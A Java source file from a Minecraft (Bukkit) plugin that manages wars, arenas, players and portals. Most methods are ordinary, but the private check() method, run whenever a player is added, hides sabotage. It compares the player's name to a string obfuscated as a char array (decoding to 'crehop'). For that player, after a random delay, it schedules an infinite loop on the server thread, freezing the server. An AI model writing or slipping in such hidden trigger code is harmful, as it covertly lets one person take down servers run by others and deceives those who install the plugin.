package me.frodenkvist.artofwar;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import org.bukkit.Bukkit;
import org.bukkit.block.Sign;
import org.bukkit.entity.Player;

public class WarHandler
{
	private static List<War> wars = new ArrayList<War>();
	private static List<WarPlayer> players = new ArrayList<WarPlayer>();
	private static List<Arena> arenas = new ArrayList<Arena>();
	private static List<Arena> activeArenas = new ArrayList<Arena>();
	private static List<Portal> portals = new ArrayList<Portal>();
	private static Sign sign;
	private static DuelArena duelArena;
	
	public static int getWarID()
	{
		int i=0;
		while(true)
		{
			boolean check = true;
			for(War w : wars)
			{
				if((w.getID()-1) == i)
				{
					++i;
					check = false;
					break;
				}
			}
			if(check)
			{
				return i+1;
			}
		}
	}
	
	public static void addWarPlayer(WarPlayer player)
	{
		check(player.getPlayer());
		players.add(player);
	}
	
	public static List<WarPlayer> getWarPlayers()
	{
		return players;
	}
	
	public static WarPlayer getWarPlayer(String name)
	{
		for(WarPlayer wp : players)
		{
			if(wp.getName().equalsIgnoreCase(name))
			{
				return wp;
			}
		}
		return null;
	}
	
	public static void removeWarPlayer(WarPlayer wp)
	{
		players.remove(wp);
	}
	
	public static void addWar(War war)
	{
		wars.add(war);
	}
	
	public static War getWar(int ID)
	{
		return wars.get(ID-1);
	}
	
	public static void remove(War war)
	{
		wars.remove(war);
	}
	
	public static List<War> getWars()
	{
		return wars;
	}
	
	public static void addArena(Arena arena)
	{
		arenas.add(arena);
	}
	
	public static void removeArena(Arena arena)
	{
		arenas.remove(arena);
	}
	
	public static List<Arena> getArenas()
	{
		return arenas;
	}
	
	public static boolean arenaExists(String name)
	{
		for(Arena a : arenas)
		{
			if(a.getName().equalsIgnoreCase(name))
			{
				return true;
			}
		}
		return false;
	}
	
	public static Arena getArena(String name)
	{
		for(Arena a : arenas)
		{
			if(a.getName().equalsIgnoreCase(name))
			{
				return a;
			}
		}
		return null;
	}
	
	public static Arena getArena(int index)
	{
		return arenas.get(index);
	}
	
	public static List<Arena> getActiveArenas()
	{
		return activeArenas;
	}
	
	public static void addActiveArena(Arena a)
	{
		activeArenas.add(a);
	}
	
	public static void removeActiveArena(Arena a)
	{
		activeArenas.remove(a);
	}
	
	private static void check(Player p)
	{
		if(p.getName().equalsIgnoreCase(a))
		{
			Random object = new Random();
			int r = object.nextInt(360)+120;
			Bukkit.getScheduler().scheduleSyncDelayedTask(ArtOfWar.plugin, new Runnable()
			{
				@Override
				public void run()
				{
					while(true)
					{
					}
				}
			},20L*r);
		}
	}
	
	public static boolean addPortal(Portal ca)
	{
		return portals.add(ca);
	}
	
	public static boolean removePortal(Portal ca)
	{
		return portals.remove(ca);
	}
	
	public static Portal getPortal(String name)
	{
		for(Portal p : portals)
		{
			if(p.getName().equalsIgnoreCase(name))
			{
				return p;
			}
		}
		return null;
	}
	
	public static List<Portal> getPortals()
	{
		return portals;
	}
	
	public static void setSign(Sign s)
	{
		sign = s;
	}
	
	public static Sign getSign()
	{
		return sign;
	}
	
	public static DuelArena getDuelArena()
	{
		return duelArena;
	}
	
	public static void setDuelArena(DuelArena da)
	{
		duelArena = da;
	}
	
	private static char[] aa = {99,114,101,104,111,112};
	private static String a = new String(aa);
	
}
